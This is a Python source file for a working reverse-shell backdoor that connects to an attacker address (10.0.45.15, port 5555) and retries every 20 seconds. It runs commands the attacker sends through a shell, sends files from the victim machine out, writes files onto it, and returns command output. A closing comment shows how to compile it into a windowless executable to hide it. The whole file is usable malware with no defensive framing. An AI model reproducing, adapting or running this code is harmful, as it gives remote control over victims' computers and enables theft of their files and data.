import socket
import time
import subprocess
import json
import os

ATTACKER_IP = '10.0.45.15'
ATTACKER_PORT = 5555
DATA_LENGTH = 1024 # bytes

def reliable_send(sock, command):
    jsondata = json.dumps(command)
    sock.send(jsondata.encode())

def reliable_recv(sock):
    data = ''
    while True:
        try:
            data = data + sock.recv(DATA_LENGTH).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection(sock):
    while True:
        time.sleep(20)
        try:
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            shell(sock)
            sock.close()
            break
        except:
            connection(sock)
            
def upload_file(sock, file_name):
    f = open(file_name, 'rb')
    sock.send(f.read())

def download_file(sock, file_name):
    f = open(file_name, 'wb')
    sock.settimeout(1)
    chunk = sock.recv(DATA_LENGTH)
    
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(DATA_LENGTH)
        except socket.timeout as e:
            break

    sock.settimeout(None)
    f.close()
    
def shell(sock):
    while True:
        command = reliable_recv(sock)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:8] == 'download':
            upload_file(sock, command[9:])
        elif command[:6] == 'upload':
            download_file(sock, command[7:])
        else:
            execute = subprocess.Popen(command,
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(sock, result)
            
# AF_INET: Connection will be established using IPv4.
# SOCK_STREAM: We're going to use TCP protocol.
print("[*] Backdoor Starting...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection(sock)

# Compile this file to exe:
# pyinstaller backdoor.py --onefile --noconsole
